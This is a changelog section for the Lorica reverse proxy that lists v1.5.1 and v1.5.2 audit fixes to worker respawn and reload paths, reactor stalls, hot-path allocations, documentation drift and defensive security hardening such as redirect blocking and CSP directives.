- v1.5.1 audit L-9 (backlog #25) : `BotEngine::fresh_nonce` now returns `([u8; 16], String)` instead of `String`. Previously the proof-of-work call site re-parsed the hex via `hex_to_16_bytes(&nonce_hex).expect("fresh_nonce returns a 32-char hex string")` (`lorica/src/proxy_wiring/bot_handlers.rs:335`), coupling generator and parser by a string-length contract that only held because the generator wrote exactly 32 lowercase hex chars - a later refactor to the generator shape (e.g. bumping to 24 bytes of entropy) would have surfaced as a worker panic on the proxy hot path. The pair return hands the raw 16-byte array straight to `pow::Challenge.nonce` without any parsing step, so the invariant is enforced by the type system instead of a runtime assertion. The captcha branch (which only needs the hex for the cookie / URL) destructures with `(_, nonce)`. Dead `hex_to_16_bytes` helper and its 3 tests removed ; its shared dependency `hex_digit` is still used by the url-decode helper and kept. Behaviour-preserving - 265 unit tests + the `engine_stash_roundtrip` test (which now asserts on both halves of the pair) stay green.

### Fixed

- v1.5.2 audit C-1 + M-26 (worker respawn path) : **Critical reliability gap** + supervisor reactor block. **C-1** : `restart_worker` returned only the cmd_fd (`Result<Option<OwnedFd>, _>`) ; the new RPC fd (the pipelined two-phase reload channel) was never picked up by the supervisor's crash branch in `monitor_workers`, so the respawned worker sat outside `worker_rpc_endpoints`. The supervisor's two-phase reload coordinator iterated over the live endpoints and silently skipped the respawned worker ; the legacy broadcast fallback only fires on two-phase failures (which there are none with the dead endpoint already cleaned up by RAII), so the respawned worker NEVER received subsequent `ConfigReloadPrepare` / `ConfigReloadCommit` commits via either path. Its `ProxyConfig`, `CertResolver`, OTel exporter, GeoIP DB, ASN DB, and bot HMAC secret state stayed frozen at boot until the next full process restart - meaning **the v1.5.2 cert hot-reload work was silently broken on any worker that had crashed since boot**. Fix : `restart_worker` now returns `Result<Option<(OwnedFd, OwnedFd)>, _>` (both fds) ; the crash branch in `lorica/src/main.rs::monitor_workers` re-spawns the supervisor RPC handler via the new `spawn_supervisor_rpc_handler(...)` helper (extracted from the inline initial-spawn block, now a single source of truth for "supervisor RPC loop for worker N" - both initial-spawn and crash branch call it, so a future RPC variant added to the match arm is wired uniformly across both paths). The respawned worker's RPC endpoint inserts back into `worker_rpc_endpoints` ; the next two-phase reload finds it and fans out the commit. **M-26** : the same `restart_worker` did `std::thread::sleep(delay)` for the exponential-backoff (up to 30 s) on the supervisor's tokio thread, blocking heartbeats from peer workers and every other tokio task on the same runtime ; with `current_thread` runtime (test mode) the entire reactor was dead during the backoff. Fix : split into `restart_backoff(id) -> Duration` (read-only computation) + `restart_worker(id)` (no internal sleep) ; the `monitor_workers` caller now drops the `std::sync::Mutex<WorkerManager>` lock between the two calls and does `tokio::time::sleep(backoff).await` in between (re-checking the `shutting_down` flag on either side of the sleep so a SIGTERM mid-backoff doesn't trigger a respawn that races shutdown). Verified end-to-end via a new section in `tests-e2e-docker/run-tests-workers.sh` : `pkill -9 worker --id 1`, wait for respawn (poll `/api/v1/workers` for new PID), update route's `maintenance_mode=true`, fan out 30 parallel requests. **Pre-fix : 12 x 503 + 18 x 200 (the 18 stale 200s = the respawned worker still on boot-time config). Post-fix : 30 x 503 + 0 x 200.** The test runner gets `pid: "service:lorica-workers"` + `user: root` in `docker-compose.yml` so it can `kill -9` worker child processes across the shared PID namespace. 268 lorica + 44 lorica-command + 14 lorica-worker tests green ; e2e workers harness adds the new C-1 regression assertion.
- v1.5.2 audit H-7 + M-9 + M-10 + L-8 (reactor stalls) : four sites that ran sync I/O / sync work on the tokio reactor and serialised unrelated handlers under load. **H-7** : `spawn_persisted_alert_dispatcher` ran `insert_notification_event` + `enforce_notification_retention` sync from inside the alert async loop ; both took `parking_lot::Mutex<Connection>` on the reactor thread, and retention errors were silently swallowed via `let _ = ...`. Both calls now batched into one `spawn_blocking` ; failures bump `lorica_notifier_events_dropped_total{reason}` (`persist_failed`, `retention_failed`, `join_failed`). **M-9** : the captcha PNG generation (~5-15 ms CPU per call) ran inline in the bot-handler async path ; wrapped in `tokio::task::spawn_blocking`. **M-10** : `LogBuffer` wrapped its inner ring buffer in `tokio::sync::RwLock` and held the write guard across the broadcast `tx.send` on every request. Switched to `parking_lot::Mutex` ; `push` / `snapshot` / `clear` became sync ; broadcast send moved out of the lock. All call sites in `proxy_wiring`, the worker log-forwarder, the API handlers, and tests drop `.await`. **L-8** : the `/metrics` handler called `sys_cache.refresh()` (sync sysinfo `/proc` reads, tens of ms) inline while holding the `system_cache` tokio Mutex guard. Wrapped in `tokio::task::block_in_place` so the worker thread can host other tasks during the sync work.
- v1.5.2 audit M-18 + M-19 + L-16 (reload semantics) : three convergence / observability gaps in cert + config reload paths. **M-18** : the legacy `CommandType::ConfigReload` worker handler (used as the fallback when two-phase RPC times out) skipped the four `apply_otel / apply_geoip / apply_asn / apply_bot_secret` hooks the two-phase commit handler runs. Under fallback, GeoIP DB / OTel endpoint / ASN DB / bot HMAC secret stayed frozen at boot. Extracted `apply_per_process_resolver_hooks` ; both reload paths call it now. **M-19** : `apply_geoip / apply_asn / apply_otel / apply_bot_secret` silently bailed on `store.get_global_settings()` `Err` ; subsequent calls compared against stale `LAST_APPLIED` memory and pinned the resolver / exporter / secret. A transient SQLite error during a `.mmdb` autoupdate cycle would freeze state for the lifetime of the process with zero signal. Now `warn!` + new `lorica_resolver_apply_failed_total{kind}` counter. **L-16** : two concurrent `reload_cert_resolver` invocations could race ; OCSP fetches at 10 s per-responder timeout mean two back-to-back commits' futures can finish out-of-order and the LAST one to finish wins the arc-swap regardless of which DB generation it read. Per-process `tokio::sync::Mutex` guard added so concurrent calls serialise.
- v1.5.2 audit L-13 + L-14 (cache hygiene) : two latent silent bugs. **L-13** : `SupervisorVerdictCache.insert` and `verdict_cache_insert` in `forward_auth.rs` both pushed to the FIFO `order` queue unconditionally on insert ; a verdict refresh ended up with two queue entries pointing at one map row, and on overflow `pop_front` removed the row even though the duplicate was still queued - the next pop became a no-op and the effective cap shrank by one per duplicate. `DashMap::insert` returns the prior value on overwrite ; both sites now gate the FIFO push on `prior.is_none()`. **L-14** : `bot::cache_insert_remote` swallowed RPC failure via `let _ = ...await`. Now logged at debug + new `lorica_bot_verdict_push_failed_total` counter (local cache is still populated whether the push succeeds, so a propagation failure only delays cross-worker sharing). **L-18** (EwmaTracker.select_best cold-backend prefer) deliberately skipped : the design is intentional, pinned by `test_ewma_tracker_prefers_unscored`. Will be addressed as a `feat` (operator-tunable cold-start strategy) if a deployment hits the thundering-herd shape in prod.
- v1.5.2 audit M-17 (observability) : two-phase config-reload Commit phase that partially succeeds (some workers committed, some timed out) was logged at `warn!` only with no Prometheus signal. Now bumps `lorica_config_reload_split_fleet_total` when both `committed` AND `commit_failed` are non-empty (true split), so operators can alert on fleet-coherence gaps. The supervisor still falls back to legacy broadcast which reconciles the stragglers, but the gap window between the partial commit and the legacy broadcast catch-up is now observable.
- v1.5.2 audit M-25 (docs) : `ConfigStore::clear_all` (used before TOML import to wipe state) deletes from 9 tables and skips 8 newer ones (sessions, bot pending challenges, probe configs + results, sla buckets, load test configs + results, cert export ACLs). The audit flagged "intent vs name unclear" - was a misread by an implementer about to ship a "clear actually clears everything" change risking session/probe-history wipe on every TOML import. Doc-comment now lists each preserved table with its rationale + spells out why `dns_providers` IS in the delete set (carries scrubbed credentials in the TOML export, must round-trip on import). Pure doc fix ; behavior unchanged.
- v1.5.2 audit M-20 (UI) : 3 incompatible `formatBytes` implementations across the dashboard (System.svelte: B/KB/MB/GB/TB log-2 with 1 decimal ; Overview.svelte: KB/MB/GB threshold-based with 0-1 decimals ; CertExportTab.svelte: B/KiB/MiB IEC with 1-2 decimals). Same operator was seeing `1.4 MB` / `1 MB` / `1.43 MiB` for the same number depending on the page they were on. New `lib/format.ts::formatBytes(bytes, opts)` accepts `units = 'binary' | 'decimal'` (default binary, IEC ; decimal preserves System.svelte's wire shape with KB/MB/GB suffixes) and `precision` (default 1). 9 new vitest cases pin the contract + the M-20 reference value.
- v1.5.2 audit M-11 + M-12 + M-13 + M-14 (perf hot path) : four allocations / format calls dropped from per-request paths. **M-11** : `render_error_page` chained 24 `String::replace` calls on a ~5 KB template = 24 allocations + 24 linear scans per error response (~120 KB intermediate alloc). Replaced with a single-pass `substitute_markers` helper that walks the template once and emits chunks into one pre-sized String. **M-12** : `RateLimitEngine::try_consume` always called `map.entry(key.to_string())` (alloc per request even on hit) ; added a `DashMap::get(&str)` fast-path - existing-key case (the common one) skips the allocation. **M-13** : `CertResolver::resolve` called `sni_raw.to_lowercase()` on every TLS handshake + `format!("*{}", suffix)` on every wildcard probe ; now skips the lowercase pass when SNI is already-lowercase (modern clients normalise) and builds the wildcard probe into a stack `[u8; 256]` buffer (DNS names <= 253 bytes per RFC 1035, fits easily). Per-handshake : 2 allocations -> 0. **M-14** : `WafEngine.evaluate`'s header loop unconditionally called `format!("header:{name}")` per (header, request) ; deferred until either the prefilter actually hits OR a custom rule is loaded. Clean traffic through headers (the common case) skips the format entirely.
- v1.5.2 audit M-24 (docs) : `docs/architecture/source-tree.md` and `docs/architecture/data-models-and-schema-changes.md` were both written against the v1.0 baseline and have drifted substantially (source-tree.md misses the `proxy_wiring/` sub-tree, the 17-module `store/` directory, 13 of 19 migrations, half the `lorica-api/` files, the 9-file `acme/` subdirectory, `slack.rs` ; data-models lists 7 tables vs today's 16+, the Route table grew from 9 columns to 30+, the NotificationChannel enum gained `Slack`). Full rewrite is `feat`-shaped ; instead, prepended a clear "Status: HISTORICAL" header on each file pointing readers to the canonical sources (workspace `tree`, migrations directory, store modules, models directory) for current state. Lists the notable additions since v1.0 so a reader looking for "what tables exist today" gets a hint to check the migrations directory rather than treating the doc as authoritative.
- v1.5.2 audit M-27 + M-28 + L-17 + L-18 : deliberately deferred. **M-27** (SLA breach + active-probe Prometheus counters) lives in `lorica-bench` which has no `prometheus` dep ; **M-28** (notification dispatch outcome counter) lives in `lorica-notify` same shape. Adding metrics in either requires either a callback-hook mechanism into the spawn sites or pulling `lorica-api` as a dep (cycle today since `lorica-api` depends on both). Either is `feat`-shaped, deferred to v1.6.0. **L-17** (EwmaTracker `RwLock<HashMap>` -> `DashMap`) requires changing the public `scores_ref()` return type that flows cross-crate to `lorica-api` ; not patch-shaped after all. **L-18** (EwmaTracker cold-backend prefer) is intentional design pinned by `test_ewma_tracker_prefers_unscored` ; would need a `feat`-shaped operator-tunable cold-start strategy.
- v1.5.2 audit M-15 + L-19 + L-20 (perf hot path) : three small allocations / chrono calls on every WAF-evaluated request. **M-15** : `metrics::record_request` used `&status_code.to_string()` for the Prometheus label - 3-char `String` per request. Switched to `itoa::Buffer` (added as direct dep of `lorica-api`). **L-19** : `WafEngine::url_decode_uri` / `url_decode_form` returned `String` even on the no-decode fast path. Switched return to `Cow<'_, str>` ; clean traffic now hits `Cow::Borrowed(input)` with zero allocation. **L-20** : `WafEngine::evaluate` / `evaluate_body` called `chrono::Utc::now().to_rfc3339()` on every request even when no rule fired. Deferred until `events.is_empty()` returns false ; events stamped with empty timestamps during scan, filled in the post-scan branch (same pattern as `client_ip` stamping).
- v1.5.2 audit M-3 : `lorica-api/openapi.yaml` `NotificationConfig.config` description enumerated the allowed Email keys verbatim but omitted the new `smtp_encryption` field shipped earlier in the v1.5.2 cycle. The downstream consumers of the spec (curl users wiring a relay manually, future SDK generators that key off the in-description enumeration, third-party docs) had no way to discover the field. Backfilled the description with the three accepted values (`"starttls"` default, `"tls"` SMTPS, `"none"` plaintext), the auto-default port behaviour (587 / 465 / 25), the backwards-compat contract (pre-v1.5.2 configs deserialise to Starttls), and the unknown-value rejection. Same description copy also documents the v1.5.2 M-1 JSON-vs-export scrub asymmetry closure : the new sentinel for masked secrets is `********` (JSON GET) vs `**REDACTED**` (TOML export), and the PUT round-trip preserves stored secrets when either sentinel is sent back unchanged.
- v1.5.2 audit H-12 : `docs/security.md` carried three drift items the v1.5.1 M-15 cross-doc number-drift audit missed because that file was out of M-15's scope. The threat-mitigation table claimed "18 OWASP CRS rules" while code shipped 49 (46 general + 3 header-scoped, see v1.5.2 H-3 work) - public-facing security claim under-stating the protection by a factor of 2.7x. Updated to the accurate count + breakdown. The "Known Limitations" section also drifted : "WAF does not scan request bodies" was wrong since v1.5.0 (body scanning shipped) and the v1.5.2 H-2 work added mode-aware truncation handling - replaced with the accurate 1 MiB scan window + Blocking/Detection mode behaviour + reference to v1.6.0 operator-tunable knob. The HTTPS-listener limitation ("requires certificates at boot. First cert added at runtime requires a restart") was wrong as of v1.5.2 (Bug #1 fix shipped cert hot-reload across both single-process and multi-worker modes) - replaced with the accurate listener-binds-before-cert-loads + add / update / delete / ACME hot-reload contract, with the explicit caveat that port-level changes still need a restart.
- v1.5.2 audit C-2 : the supervisor's per-worker reload-dispatcher task used `Ok(seq) = reload_rx.recv() => {...}` inside `tokio::select!`. When `recv()` returned `Err(Lagged(n))` (broadcast channel overflowed past its 16-slot capacity faster than the worker could consume), the `Ok(seq)` pattern did NOT match - tokio silently discarded the value and the branch was disabled for the iteration. Workers missed every `ConfigReload` that fell out of the ring while busy in another arm of the select (e.g. servicing a long BanIp send-then-recv) - landing on a stale config with zero log, zero metric, zero notification. The matching BanIp arm at `:967` already handled `RecvError::Lagged` and surfaced `lorica_ban_broadcast_lagged_total` ; the reload arm did not. Both the initial-spawn (`main.rs:988`) and the restart-monitor (`:1654`) paths rewritten with explicit `match` on `recv()` : `Err(Lagged(n))` warns, increments the new `lorica_reload_broadcast_lagged_total{worker_id}` counter, and synthesises a single catch-up reload with a fresh sequence number from the per-worker counter so the worker reaches the latest DB state ; `Err(Closed)` breaks the loop. Same shape, mirroring the BanIp pattern. Surfaces reload starvation as a Prometheus signal an operator can alert on instead of a silent stale-config drift.
- In worker mode, uploaded certificates (`POST /api/v1/certificates`) and ACME-issued certificates (HTTP-01, DNS-01, DNS-01 manual) required a full Lorica restart before the worker's TLS stack could serve them. Root cause : `handle_config_reload_commit` in `lorica/src/proxy_wiring.rs` (the worker-side handler for the two-phase RPC `ConfigReloadCommit`, which replaced the legacy one-shot `CommandType::ConfigReload` in v1.4.0 / WPAR-8) only swapped the `Arc<ProxyConfig>` and re-applied the OTel / GeoIP / ASN / bot-HMAC settings. The matching `reload_cert_resolver` call present on the legacy `CommandType::ConfigReload` path (`main.rs:2852`) and on the single-process `config_reload_rx` listener (`main.rs:3878`) was never ported to the RPC commit handler, so the worker's `CertResolver` stayed frozen on the cert set loaded at boot. `spawn_worker_rpc_listener` + `handle_config_reload_commit` now take an `Arc<CertResolver>` and call `crate::reload::reload_cert_resolver(store, cert_resolver).await` after the ArcSwap, so every `notify_config_changed` triggered by a cert create / upload / ACME finalize / self-signed generate fans out to each worker's resolver inside the same Commit round. Route-references filter preserved : certs still only load when at least one route's `certificate_id` points at them (same invariant as single-process mode ; ACME-issued certs become reachable as soon as the operator links them to a route). **Followup (same fix) :** the Commit handler now sends `inc.reply(Response::ok(0)).await` BEFORE invoking `reload_cert_resolver`. Reason : the supervisor coordinator's `CONFIG_RELOAD_COMMIT_TIMEOUT` is 500 ms, but `reload_cert_resolver` does parallel OCSP fetches with a 10 s per-responder timeout (`lorica-tls::ocsp::try_fetch_ocsp`). A slow OCSP responder would otherwise blow the deadline, trigger the legacy-broadcast fallback, and duplicate the reload work on a separate command channel. Replying first keeps the two-phase semantics atomic at the ProxyConfig + connection-filter level (which is what the 500 ms deadline actually protects) and lets the resolver update happen best-effort in the background of the same handler. The same window exists in single-process mode (sequential `reload_proxy_config_with_mtls` then `reload_cert_resolver` at `main.rs:3868-3878`, no deadline) - worker mode now matches. **Bonus (same fix) :** the `spawn_renewal_task` + `spawn_cert_expiry_check_task` background loops (check every 12 h, renew at 30 days before expiry, alert via the notification dispatcher) were only spawned in single-process mode, so worker-mode installs had no ACME auto-renewal at all - certs issued at day 0 would silently expire at day 90. Both tasks now run on the worker-mode supervisor alongside the API handlers. Unblocks the v1.5.2 deployment at the new production client who surfaced the bug.
- v1.5.1 audit L-14 : the Notification + Preference endpoints surfaced their request / response bodies as `type: object` with no inner `properties`, so external consumers (curl users, generated SDKs, third-party docs, the `tests-e2e-docker` runner) had no contract to validate against. Added 5 new schemas to `components/schemas` : `NotificationConfig` (entity, with channel + enabled + JSON config blob + alert_types ; doc-comment cross-references the H-1 + L-5 secret scrub on the embedded `config` JSON), `CreateNotificationRequest` + `UpdateNotificationRequest` (request bodies), `UserPreference` (entity, with the tri-state value enum), `UpdatePreferenceRequest` (request body). Five endpoint sites now `$ref` these schemas instead of `type: object` : `GET / POST /api/v1/notifications`, `PUT /api/v1/notifications/{id}`, `GET /api/v1/preferences`, `PUT /api/v1/preferences/{id}`. Validation : `yaml.safe_load` parses cleanly, schemas count 13 -> 18, paths count unchanged at 79. Other `type: object` sites in the spec (status / system / workers / waf endpoints) are out of patch scope ; they are read-only and lower-stakes than the credential-carrying notification + preference paths covered here.
- v1.5.1 audit L-11 + L-13 (story 7.3 task list rectification, paired with the H-5 + L-12 followup notes) : `docs/stories/story-7.3-anti-ddos.md` had three drift items in its task list. Rectified inline so the story doc now matches the v1.5.0 ship state and explicitly points to the v1.6.0 backlog for residual items. Changes : (a) the `ban_threshold` / `ban_duration_s` field names corrected to `waf_ban_threshold` / `waf_ban_duration_s` (the `waf_` prefix is more accurate - they are triggered by WAF events specifically, not by the rate-limit subsystem) ; default values corrected from 5 / 600 to 3 / 3600 to match `lorica-api/src/settings.rs`. (b) `header_timeout_s` task unticked with annotation pointing to backlog #17 (audit H-5) - the slowloris timeout currently uses Pingora's default ; operator-tunable threshold deferred to v1.6.0. (c) `flood_strict_rps` task unticked with same annotation - `flood_threshold_rps` shipped, `flood_strict_rps` is hardcoded at 0.5x and operator-tunable variant deferred. (d) "Add dashboard ban list view" task re-ticked (was `[ ]` while story Status was Done - inconsistent) with annotation that the `reason` field is missing because the backend stores `(banned_at, duration_s)` only ; surfacing the trigger reason requires a `BanReason` enum + API field deferred to backlog #22 (audit L-12).
- v1.5.1 audit M-14 : `lorica-api/openapi.yaml` was 12 routes out-of-sync with `server.rs`. The 12 endpoints (`POST /validate/mtls-pem`, `POST /validate/forward-auth`, `GET / POST /dns-providers`, `PUT / DELETE /dns-providers/{id}`, `POST /dns-providers/{id}/test`, `GET /notifications/history`, `DELETE /sla/routes/{id}/data`, `GET /probes/{id}/history`, `POST /settings/otel/test`, `GET /logs/export`, `POST /acme/provision-dns-manual/check`, `POST /certificates/{id}/renew`) were registered in `server.rs:215-560` but had no `paths:` entry. External consumers of the OpenAPI (curl users, future SDK gen, test scaffolding, third-party docs) could not discover them ; three of them (`/validate/mtls-pem`, `/validate/forward-auth`, `/settings/otel/test`) accept user-supplied content so the missing contract was a real input-validation expectation gap. Backfilled all 12 with reasonable schemas (auth requirement, request body shape where applicable, 200 / 400 / 401 / 404 / 500 response codes). Two new tags : `DnsProviders` (groups the 5 dns-provider entries) and `Validation` (groups the 2 pre-flight check entries) ; the rest fold into existing tags (`Settings`, `Logs`, `ACME`, `Certificates`, `SLA`, `Probes`, `Notifications`). The audit also recommended a CI drift-check that asserts every `.route(` has a matching `paths:` entry - tracked as a v1.6.0 process improvement (out of patch scope).
- v1.5.1 audit M-15 : cross-document numerical drift on user-visible claims. Code (`lorica-waf/src/rules.rs`) shipped 49 WAF rules and `lorica-waf/src/ip_blocklist.rs` correctly described the upstream Data-Shield IPv4 blocklist as ~80k entries, but three docs had drifted out-of-sync : `docs/security/threat-model.md` claimed "18 OWASP-inspired rules" and "800k+ known malicious IPs", `docs/security/hardening-guide.md` claimed "800k+", `docs/architecture/source-tree.md` claimed "18 OWASP-inspired regex rules" and "800k+ IPs". CHANGELOG entries are immutable history (v1.0.0 entry citing "39 rules" is correct - that was the count then) so they stay as written. Updated to `49` (with the 46 general + 3 header-scoped breakdown introduced in audit H-3) and `~80k` everywhere live. Threat-model T5 transitive-advisories table also updated to mention the v1.5.1 audit L-16 lorica-tls migration : RUSTSEC-2025-0134 now closes once `lorica-tls` bumps `rustls-native-certs 0.7.x -> 0.8` (which itself dropped the `rustls-pemfile` dep) - tracked in `docs/backlog.md`. New "Drift checks" section in `docs/BUMP-CHECKLIST.md` carries the grep recipes operators / future-self can paste when editing `lorica-waf/` or bumping the version, plus the catch-history so the next regression is noticed early.
- v1.5.1 audit M-13 : the LoadTest dashboard route's WebSocket reconnect logic (`ws.onclose = () => { wsConn = null; setTimeout(connectWS, 3000); };`) did not store the timer id, so navigating away during the 3 s backoff window left the timer alive ; it fired after `onDestroy` (which only closed the current connection), opened a fresh WebSocket with no consumer, and accumulated one zombie connection per navigate-out-and-back-in cycle. New `reconnectTimer: ReturnType<typeof setTimeout> | null` tracks the pending timer ; `mounted: boolean` flag tracks the component lifecycle. `onDestroy` cancels the pending timer + clears the flag + closes the live connection. `connectWS` short-circuits when `mounted === false` so a stale reconnect that survived the cancel race never opens a zombie WebSocket. `ws.onclose` skips scheduling the reconnect altogether when the component is already unmounting (the close was triggered by our own `onDestroy` and there is nothing to reconnect to). Defense in depth at three points : timer cancel + mounted gate at spawn + early return on unmount-during-onclose.
- v1.5.1 audit M-11 : SPA route-detail loaders had a classic stale-overwrite race. In `Sla.svelte::selectRoute(routeId)` the user selects route A, four `Promise.all` fetches dispatch (passive SLA + active SLA + config + buckets), then before they resolve the user clicks route B - B's selectRoute fires its own four fetches, but A's resolve first and overwrite `passiveSla` / `activeSla` / `slaConfig` / `buckets` with route A's data even though `selectedRouteId` is now B. Compounded by the 30 s `refreshTimer` calling `selectRoute(selectedRouteId)` on every tick : a refresh fired during a manual selection clobbers the new view. Same shape in `Probes.svelte::showHistory(probe)` (clicking a second probe before the first history fetch resolves overwrites the new probe's history view). Fix : capture the requested id into a local `const captured = ...` BEFORE awaiting the fetch, then early-return after the await when `selectedRouteId !== captured` (or `historyProbe?.id !== captured`). Lock-free, allocation-free guard ; the in-flight stale fetches still run (no AbortController plumbing required) but their responses are silently dropped. Other route components scanned (Routes / Backends / Certificates / LoadTest / Settings / Security / Overview / System) do list-refresh patterns rather than per-item-detail loads, so the same race shape does not apply.
- v1.5.1 audit M-10 : `health::http_probe` built a fresh `reqwest::Client` on every invocation - one per backend per probe interval (default 5 s). Each build allocated a new connection pool, TLS context, resolver state, and forced a fresh TCP handshake (no idle-pool reuse) plus a TLS context setup on every probe. With 100 backends + 5 s interval that was ~20 client builds / s plus the connection churn ; under sustained probe load the constant build / handshake / drop cycle wasted CPU on a hot path that runs whether or not the operator has any actual traffic. New process-wide `HEALTH_HTTP_CLIENT: Lazy<reqwest::Client>` mirrors the static-client precedent in `proxy_wiring/mirror_rewrite.rs::MIRROR_CLIENT` and `proxy_wiring/forward_auth.rs::FORWARD_AUTH_CLIENT` ; built once at first probe with the existing 5 s timeout + `danger_accept_invalid_certs(true)` (kept because operator backends commonly run with self-signed / wildcard certs - this is a liveness probe, not an end-to-end TLS chain check ; the trust boundary is the operator's network) + `pool_max_idle_per_host(8)` so successive probes against the same backend reuse a warm TCP / TLS connection. Per-probe overhead drops to a single GET on a pooled connection. Same v1.3.0 audit M-1 fix that EwmaTracker received - extending it to the health subsystem closes the parallel pattern.
- v1.5.1 audit M-9 : every cert-creation path (`create_certificate`, `generate_self_signed`, ACME HTTP-01, ACME DNS-01, ACME DNS-01 manual confirm) called `crate::cert_export::export_from_store(&store, &cert)` synchronously from inside the `state.store.lock().await` scope. The exporter ran `fs::create_dir_all` + 4 atomic file writes + `chown` + `chmod` per cert ; on a cross-mount `cert_export_dir` the EXDEV fallback added a `copy + fsync + rename` round-trip per file. Holding the single `tokio::sync::Mutex<ConfigStore>` across all of that head-of-line-blocked every other API handler waiting on the same mutex (which is every state-mutating endpoint - 30+ handlers). New `export_after_release(settings, acls, cert)` takes owned snapshots and runs the export in `tokio::task::spawn_blocking` ; awaits completion so the response timing matches the previous synchronous behaviour. Companion `snapshot_export_inputs(&store) -> Option<(GlobalSettings, Vec<CertExportAcl>)>` pulls the inputs while the lock is held and lets the caller drop it BEFORE the spawn. Five call sites collapsed to the same pattern : lock store -> create_certificate -> snapshot_export_inputs -> drop(store) -> export_after_release.await. The legacy `export_from_store(&store, &cert)` synchronous wrapper is removed - all call sites migrated. Settings-query failures still log `warn!` and skip the export with the same shape (the new `snapshot_export_inputs` returns `None`, the call site short-circuits past the export). The fail-soft contract (cert in the DB before this runs ; missing disk copy never blocks the request) is preserved.
- v1.5.1 audit L-7 : the Cloudflare and OVH DNS-01 challengers built their HTTP client with `reqwest::Client::new()`, which has no per-request timeout set. A hung DNS provider API endpoint (network split, provider outage that left the TCP socket open without sending a response, captive-portal hijack) could hold the ACME flow open indefinitely - the surrounding DNS-propagation wait loop has its own bigger timeout, but the per-call HTTP work could starve a tokio task forever. Both challengers now build their client via `reqwest::Client::builder().timeout(Duration::from_secs(30)).build()` ; new module-level constants `CLOUDFLARE_HTTP_TIMEOUT` and `OVH_HTTP_TIMEOUT` (both 30 s, well above worst-case healthy response for either provider while still bounding a stuck call). The builder is infallible with a static timeout so the `.expect` carries an explanatory message rather than a real failure-handling path. Existing wiremock-based unit coverage of both challengers (added in v1.5.0 backlog #9) keeps passing - mock responses are immediate so the timeout never fires in CI. No changelog-worthy behaviour change for healthy ACME flows ; only the pathological "stuck request" case is now bounded.
- v1.5.1 audit L-6 : the proxy hot path persisted WAF events with `let _ = store.insert_waf_event(...);` at six call sites in `proxy_wiring.rs` (IP blocklist match, request-eval blocking + detection paths, body-eval blocking + detection paths, body-truncated event from H-2). Any persistence failure (full disk, corrupted DB, schema mismatch) silently dropped events without an operator signal - the SQLite-backed forensics trail could go cold for hours before someone noticed during incident triage. New helper `LoricaProxy::persist_waf_event(&WafEvent)` factorises the `if let Some(store) ... insert_waf_event ... swallow Err` pattern and replaces the silent swallow with a `tracing::warn!` (carrying the underlying error message + the event's rule id and category for triage) plus a `lorica_waf_event_persist_failed_total` Prometheus counter so an operator can alert on a stalled persistence path. The proxy keeps serving regardless ; the in-memory ring buffer + Prometheus category counters still surface the events, only the persistent forensics trail is broken. New `IntCounter` lives in `lorica-api/src/metrics.rs` alongside the other notifier-failure counters ; helper `inc_waf_event_persist_failed()` exposed for the persist site to call. Six call sites in `proxy_wiring.rs` collapsed from a 3-line block each to a single `self.persist_waf_event(ev)` call ; doc-comment on the new method records the audit traceability.

### Security

- v1.5.2 audit L-2 + L-4 + L-5 + L-6 + L-7 (security defense in depth) : five surface-narrowing fixes. **L-2** : `validate_target_url` (load test config) now rejects (a) ports != `http_port` / `https_port` (the load tester forces DNS to loopback, so an off-port target turned the load tester into a localhost port-scanner) and (b) paths starting with `/api/`, `/lorica/`, `/metrics`, `/.well-known/` (management plane amplification path). 3 new test sites + extended IPv6 parser. **L-4** : `test_notification`'s `BadRequest` arm on `serde_json` deserialisation echoed verbatim `e.to_string()` (could include input bytes from malformed JSON). Mirrors v1.5.1 M-12 : log inner detail at `warn!`, return fixed user-facing message. **L-5** : dashboard CSP gains `frame-ancestors 'none'`, `form-action 'self'`, `base-uri 'none'`, `object-src 'none'` ; 4 new assertions in the existing CSP test. **L-6** : ~16 mutating endpoints layered with `rl("destructive_cud", 60, 60)` (cache purge, bans, backends, certs, dns-providers, notifications, preferences, WAF rules, SLA config, probes, loadtest configs). `DELETE /api/v1/logs` and `DELETE /api/v1/waf/events` (full forensics-trail wipe) get a tighter `rl("logs_clear", 1, 60)` so a stolen session cookie cannot flush the trail in one call. **L-7** : webhook + OCSP + WAF blocklist `reqwest::Client` builders gain `.redirect(reqwest::redirect::Policy::none())` (matches forward_auth's existing precedent). Defends against attacker-controlled URL / cert chain / poisoned blocklist feed redirecting into an internal service (169.254.169.254, Consul, AWS metadata).
- v1.5.2 audit M-6 (chore) : `cargo tree -p lorica -i aws-lc-rs` confirmed `aws-lc-rs` WAS in the binary, pulled via `lorica-tls`'s `rustls = "0.23.12"` (default features include both `ring` AND `aws-lc-rs`). Other crates already pinned `ring`-only, but `lorica-tls` was the leftover that kept the parallel crypto stack alive (~2-3 MiB extra binary + the `aws-lc-sys` C build chain). `lorica-tls/Cargo.toml` `rustls` and `tokio-rustls` deps now carry `default-features = false, features = ["ring", ...]` (matches `lorica/Cargo.toml`'s pin). `cert_resolver.rs::any_supported_type` import switched from `rustls::crypto::aws_lc_rs::sign` to `rustls::crypto::ring::sign`. Post-fix : `cargo tree -p lorica | grep aws-lc-rs` returns 0 occurrences. The `route53` Cargo feature still pulls `aws-lc-rs` (via `aws-smithy-http-client` -> `rustls 0.21`) ; that's a separate v1.7.0 cleanup.
- v1.5.2 audit L-10 (deps) : `lorica-tls` `x509-parser` bumped 0.16 -> 0.18 to align with `lorica-api`'s pin (set in v1.5.1 audit L-15). API surface used here (`pem::parse_x509_pem`, `parse_x509_certificate`, `extensions::{ParsedExtension::AuthorityInfoAccess, GeneralName::URI}`, `oid_registry::OID_PKIX_ACCESS_DESCRIPTOR_OCSP`) is stable across 0.16 -> 0.17 -> 0.18. **Honest note** : full `asn1-rs` / `oid-registry` / `der-parser` de-duplication is NOT achieved by this bump because `lorica-core` (forked Pingora crate) still pins `x509-parser 0.16.0`. Touching the forked code is outside the patch scope ; the deduplication will close once Pingora upstream bumps `x509-parser`, or when we do a coordinated bump across the forks (deferred to v1.7.0 alongside the other Pingora-fork maintenance items).
